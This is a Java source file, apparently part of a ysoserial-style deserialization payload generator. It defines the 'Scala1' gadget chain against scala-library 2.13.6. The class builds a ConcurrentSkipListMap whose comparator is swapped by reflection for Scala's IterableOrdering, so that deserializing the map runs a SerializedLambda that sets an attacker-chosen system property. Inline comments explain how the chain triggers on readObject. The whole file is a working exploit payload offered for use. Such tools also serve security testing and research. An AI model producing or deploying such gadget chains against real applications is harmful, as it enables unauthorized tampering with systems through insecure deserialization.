package payloads;

import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import scala.Tuple2;
import sun.reflect.ReflectionFactory;
import util.PayloadRunner;
import util.StubClassConstructor;

import java.io.*;
import java.lang.invoke.MethodHandleInfo;
import java.lang.invoke.SerializedLambda;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.concurrent.ConcurrentSkipListMap;


@SuppressWarnings({"rawtypes"})
@Dependencies({"org.scala-lang:scala-library:2.13.6"})
@Authors({ Authors.JARIJ })
public class Scala1 extends PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		String[] nameValue = command.split(":");
		String key = nameValue[0];
		String value = nameValue[1];

		ReflectionFactory rf =
				ReflectionFactory.getReflectionFactory();

		Tuple2 prop = new scala.Tuple2<>(key, value);

		// Should be: 142951686315914362
		long versionUID = ObjectStreamClass.lookup(scala.Tuple2.class).getSerialVersionUID();
//		System.out.println("VersionUID: " + versionUID);

		SerializedLambda lambdaSetSystemProperty = new SerializedLambda(scala.sys.SystemProperties.class,
				"scala/Function0", "apply", "()Ljava/lang/Object;",
				MethodHandleInfo.REF_invokeStatic, "scala.sys.SystemProperties",
				"$anonfun$addOne$1", "(Lscala/Tuple2;)Ljava/lang/String;",
				"()Lscala/sys/SystemProperties;", new Object[]{prop});

		Class<?> clazz = Class.forName("scala.collection.View$Fill");
		Constructor<?> ctor = clazz.getConstructor(int.class, scala.Function0.class);
		Object view = ctor.newInstance(1, createFuncFromSerializedLambda(lambdaSetSystemProperty));

		clazz = Class.forName("scala.math.Ordering$IterableOrdering");
		ctor = rf.newConstructorForSerialization(
				clazz, StubClassConstructor.class.getDeclaredConstructor()
		);

		Object iterableOrdering = ctor.newInstance();

		// on readObject, ConcurrentSkipListMap invokes comparator.compare(Object x, Object y);
		// Initialize ConcurrentSkipList with a dummy comparator (a comparator that allows putting values into the list)
		ConcurrentSkipListMap map = new ConcurrentSkipListMap((o1, o2) -> 1);

		// add the view entry to the map, when the view.iterable().next() is invoked, the System.setProperty lambda is executed
		map.put(view, 1);
		map.put(view, 2);

		// Replace the comparator with the IterableComparator
		// IterableComparator is responsible for executing the view.iterable().next() on comparison
		Field f = map.getClass().getDeclaredField("comparator");
		f.setAccessible(true);
		f.set(map, iterableOrdering);

		return map;
	}

	private static Object createFuncFromSerializedLambda(SerializedLambda serialized) throws IOException, ClassNotFoundException {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(baos);
		oos.writeObject(serialized);

		ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
		return ois.readObject();
	}

	public static byte[] getBytes (final String command, Boolean fusion) throws Exception {
		return PayloadRunner.run(Scala1.class, command,fusion);
	}
}
